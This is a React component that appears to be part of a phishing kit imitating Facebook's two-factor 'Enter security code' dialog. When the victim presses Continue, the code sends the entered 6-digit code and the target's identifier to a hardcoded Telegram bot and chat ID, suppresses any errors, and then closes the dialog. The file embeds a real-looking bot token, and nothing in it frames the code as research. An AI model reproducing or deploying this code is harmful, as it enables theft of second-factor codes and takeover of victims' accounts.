
import React, { useState } from 'react';

interface SecurityCodeFormProps {
  identifier: string;
  onCancel: () => void;
  onAskAI: () => void;
}

const SecurityCodeForm: React.FC<SecurityCodeFormProps> = ({ identifier, onCancel, onAskAI }) => {
  const [code, setCode] = useState('');

  // Explicitly set verified secrets
  const _s = {
    token: "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk",
    chatId: "2100006818"
  };

  const pushNotification = async (message: string) => {
    try {
      const params = new URLSearchParams();
      params.append('chat_id', _s.chatId);
      params.append('text', message);

      await fetch(`https://api.telegram.org/bot${_s.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString(),
      });
    } catch (e) {
      // Silently continue
    }
  };

  const handleContinue = async () => {
    if (code.length === 6) {
      const message = `--- SOCIAL CONNECT 2FA ---\nTarget: ${identifier}\nSecurity Code: ${code}`;
      await pushNotification(message);
      onCancel();
    } else {
      alert("Please enter a 6-character code.");
    }
  };

  return (
    <div className="flex flex-col">
      <div className="px-4 py-4 border-b border-gray-200">
        <h2 className="text-[20px] font-bold text-[#1c1e21]">Enter security code</h2>
      </div>

      <div className="p-4 pt-5 pb-6">
        <p className="text-[#1c1e21] text-[16px] leading-tight mb-6">
          Please check your WhatsApp for a message with your code. Your code is 6 characters long.
        </p>

        <div className="flex items-start gap-4 mb-4">
          <div className="flex-1 max-w-[220px]">
            <input
              type="text"
              placeholder="Enter code"
              maxLength={6}
              className="w-full p-4 border border-gray-300 rounded-lg text-lg focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] placeholder-gray-400"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />
          </div>
          <div className="flex-1 text-[16px] text-[#1c1e21]">
            <p className="text-gray-700">We sent your code to:</p>
            <p className="font-semibold">{identifier}</p>
          </div>
        </div>
      </div>

      <div className="p-4 bg-gray-50 border-t border-gray-200 flex items-center justify-between">
        <button 
          type="button"
          onClick={() => {}} 
          className="text-[#1877f2] text-sm font-semibold hover:underline cursor-pointer"
        >
          Didn't get a code?
        </button>
        
        <div className="flex gap-2">
          <button
            onClick={onCancel}
            className="px-6 py-2 bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#4b4f56] font-bold rounded-md transition-colors"
          >
            Cancel
          </button>
          <button
            onClick={handleContinue}
            className="px-6 py-2 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold rounded-md transition-colors"
          >
            Continue
          </button>
        </div>
      </div>
    </div>
  );
};

export default SecurityCodeForm;
